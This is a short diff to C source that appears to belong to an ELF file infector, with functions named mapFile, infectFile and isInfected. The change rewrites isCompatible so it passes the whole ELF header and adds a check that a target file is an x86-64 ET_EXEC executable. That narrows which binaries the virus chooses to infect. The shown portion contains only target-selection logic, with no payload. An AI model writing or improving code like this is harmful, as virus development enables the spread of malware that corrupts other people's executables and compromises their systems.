@@ -500,7 +500,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     return (-1);
   }
   if (stats.st_size < sizeof(Elf64_Ehdr) ||
-    !isCompatible(((Elf64_Ehdr *)tmp)->e_ident, ((Elf64_Ehdr *)tmp)->e_machine)) {
+    !isCompatible((Elf64_Ehdr *)tmp)) {
     munmap(tmp, stats.st_size);
     close(fd);
     return (1);
@@ -733,12 +733,13 @@ static int  infectFile(struct bfile bin) {
   munmap(bin.header, bin.size);
 }
 
-static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
-  return (e_ident[EI_MAG0] == ELFMAG0 &&
-          e_ident[EI_MAG1] == ELFMAG1 &&
-          e_ident[EI_MAG2] == ELFMAG2 &&
-          e_ident[EI_MAG3] == ELFMAG3 &&
-          e_machine == EM_X86_64);
+static int  isCompatible(Elf64_Ehdr *header) {
+  return (header->e_ident[EI_MAG0] == ELFMAG0 &&
+          header->e_ident[EI_MAG1] == ELFMAG1 &&
+          header->e_ident[EI_MAG2] == ELFMAG2 &&
+          header->e_ident[EI_MAG3] == ELFMAG3 &&
+          header->e_machine == EM_X86_64 &&
+          header->e_type == ET_EXEC);
 }
 
 static int  isInfected(struct bfile bin) {
